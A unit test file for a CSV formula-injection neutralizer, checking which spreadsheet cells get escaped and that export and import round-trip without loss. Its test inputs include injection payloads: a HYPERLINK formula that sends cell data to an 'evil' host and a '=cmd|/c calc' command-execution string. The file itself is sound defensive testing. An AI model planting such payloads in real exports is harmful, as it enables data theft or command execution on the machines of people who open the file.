/**
 * Unit tests for the CSV formula-injection (CWE-1236) neutralizer. Pure
 * input→output, no IO. Pins exactly which cells get the leading-quote escape
 * and — just as important — which DON'T (so the export stays faithful).
 */

import { describe, expect, test } from 'bun:test';
import { denormalizeCsvCell, neutralizeCsvCell, neutralizeCsvRow } from '../csv-safety';

describe('neutralizeCsvCell — escapes formula-trigger strings', () => {
  test.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1+2', "'-1+2"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['=HYPERLINK("//evil?"&A1,"x")', '\'=HYPERLINK("//evil?"&A1,"x")'],
    ['\tlead-tab', "'\tlead-tab"],
    ['\rlead-cr', "'\rlead-cr"],
  ])('prefixes %p with a single quote', (input, expected) => {
    expect(neutralizeCsvCell(input)).toBe(expected);
  });

  test.each([
    // A value the user genuinely typed as `'`+trigger gets ONE MORE `'` (the invertible escape, ruled
    // 2026-06-30) so the importer can restore the literal leading `'` instead of over-stripping it.
    ["'=Daily", "''=Daily"],
    ["'=mc2 rebate", "''=mc2 rebate"],
    ["'+1 driver fee", "''+1 driver fee"],
    ["'@home charge", "''@home charge"],
    ["''=already escaped", "'''=already escaped"], // each layer adds exactly one `'`
  ])('escapes an apostrophe-run-then-trigger %p → %p', (input, expected) => {
    expect(neutralizeCsvCell(input)).toBe(expected);
  });
});

describe('neutralizeCsvCell — leaves safe values untouched', () => {
  test('a plain string is unchanged', () => {
    expect(neutralizeCsvCell('Shell top-up')).toBe('Shell top-up');
  });

  test('an empty string is unchanged (no spurious quote)', () => {
    expect(neutralizeCsvCell('')).toBe('');
  });

  test('a trigger char NOT in first position is inert and left alone', () => {
    expect(neutralizeCsvCell('a=b')).toBe('a=b');
    expect(neutralizeCsvCell('1-2')).toBe('1-2'); // a date-ish string mid-cell
  });

  test('a leading apostrophe before a NON-trigger is left untouched (the foreign-import contract)', () => {
    // `'24 road trip` / `'twas` are NOT apostrophe-run-then-trigger (2nd char is a non-trigger), so
    // neutralize does NOT add a quote — preserving the hand-authored leading-apostrophe value verbatim.
    expect(neutralizeCsvCell("'24 road trip")).toBe("'24 road trip");
    expect(neutralizeCsvCell("'twas the night")).toBe("'twas the night");
    expect(neutralizeCsvCell("'")).toBe("'"); // a lone apostrophe (no trigger follows)
  });

  test('numbers pass through with their type intact (incl. negatives)', () => {
    // The whole point: a legitimately-negative amount must NOT become a string.
    expect(neutralizeCsvCell(-50)).toBe(-50);
    expect(neutralizeCsvCell(52.4)).toBe(52.4);
    expect(neutralizeCsvCell(0)).toBe(0);
  });

  test('booleans / null / undefined pass through unchanged', () => {
    expect(neutralizeCsvCell(true)).toBe(true);
    expect(neutralizeCsvCell(null)).toBe(null);
    expect(neutralizeCsvCell(undefined)).toBe(undefined);
  });
});

describe('neutralizeCsvRow — guards string cells, preserves the rest', () => {
  test('only the dangerous string cells are escaped', () => {
    const out = neutralizeCsvRow({
      amount: -50, // negative number stays numeric
      description: '=cmd|/c calc', // dangerous → escaped
      vehicle: 'Daily Driver', // safe → unchanged
      tags: '@everyone', // dangerous → escaped
      mileage: '', // empty → unchanged
    });
    expect(out).toEqual({
      amount: -50,
      description: "'=cmd|/c calc",
      vehicle: 'Daily Driver',
      tags: "'@everyone",
      mileage: '',
    });
  });

  test('returns a new object (does not mutate the input)', () => {
    const input = { description: '=evil' };
    const out = neutralizeCsvRow(input);
    expect(input.description).toBe('=evil'); // original untouched
    expect(out.description).toBe("'=evil");
  });
});

describe('denormalizeCsvCell — symmetric inverse for round-trip import', () => {
  test.each([
    ["'=1+1", '=1+1'],
    ["'+1", '+1'],
    ["'-1+2", '-1+2'],
    ["'@SUM(A1)", '@SUM(A1)'],
    ["'\tx", '\tx'],
    ["'\rx", '\rx'],
  ])('strips the neutralization prefix: %p → %p', (input, expected) => {
    expect(denormalizeCsvCell(input)).toBe(expected);
  });

  test.each([
    "'24 road trip", // user-typed apostrophe + non-trigger → keep (foreign-import contract)
    "'twas the night", //
    'plain text',
    '=not-prefixed', // a bare formula (never produced by export, zero-length run) is left as-is
    '', // empty
    "'", // lone apostrophe (no trigger follows)
  ])('leaves a non-neutralized value untouched: %p', (input) => {
    expect(denormalizeCsvCell(input)).toBe(input);
  });

  test('peels exactly ONE neutralization layer off an apostrophe-run-then-trigger', () => {
    // `''=double` is what neutralize produces for a user-typed `'=double`; denormalize peels one `'`.
    expect(denormalizeCsvCell("''=double")).toBe("'=double");
    expect(denormalizeCsvCell("'''=triple")).toBe("''=triple");
  });

  test('is the exact inverse of neutralizeCsvCell for trigger strings', () => {
    for (const v of ['=evil', '+1', '-2', '@x', '\tt', '\rr']) {
      expect(denormalizeCsvCell(neutralizeCsvCell(v) as string)).toBe(v);
    }
  });

  test('is idempotent on already-clean values', () => {
    expect(denormalizeCsvCell(denormalizeCsvCell("'=x"))).toBe('=x');
  });
});

// ---------------------------------------------------------------------------
// ROUND-TRIP FIDELITY (RULED 2026-06-30, vlm/csv-apostrophe — optimize VROOM-own-export). The C401
// asymmetry is CLOSED: a value the user genuinely typed as `'`+trigger (e.g. a vehicle nickname
// `'=Daily`, a description `'=mc2 rebate`) now round-trips LOSSLESSLY. neutralizeCsvCell adds an
// invertible escape (`'=Daily` → `''=Daily`); denormalizeCsvCell peels exactly one layer
// (`''=Daily` → `'=Daily`). The matched escape makes neutralize↔denormalize a true inverse for EVERY
// value while leaving the foreign-import contract intact (a leading `'` before a NON-trigger is never
// touched on either side). These assert the round-trip is now faithful — the property that matters.
// ---------------------------------------------------------------------------
describe('neutralizeCsvCell ↔ denormalizeCsvCell — LOSSLESS round-trip for every value (C527, ruling landed)', () => {
  test.each([
    // The crux: a user-typed `'`+trigger value survives export→import EXACTLY (was the C401 data-loss).
    "'=Daily", // a vehicle nickname forced-to-text with a leading '
    "'=mc2 rebate", // a description
    "'+1 driver fee",
    "'@home charge",
    "'-5 credit",
    // Plain formulas (the spreadsheet-safety case) round-trip to the user's original too.
    '=SUM(A1:A9)',
    '+1',
    '@x',
    // And the hand-authored leading-apostrophe-before-non-trigger value is unchanged by BOTH sides.
    "'24 road trip",
    "'twas the night",
    // Ordinary free text + numbers (as strings) are inert.
    'Shell top-up',
    '-50.00 is a string here',
  ])('export→import returns the original value unchanged: %p', (original) => {
    const exported = neutralizeCsvCell(original) as string;
    expect(denormalizeCsvCell(exported)).toBe(original);
  });

  test("a `'`+trigger value is ESCAPED on export (not left bare) so import can restore it", () => {
    const userTyped = "'=Daily";
    expect(neutralizeCsvCell(userTyped)).toBe("''=Daily"); // export now escapes it (the fix)
    expect(denormalizeCsvCell("''=Daily")).toBe(userTyped); // import restores the literal '=Daily
  });
});
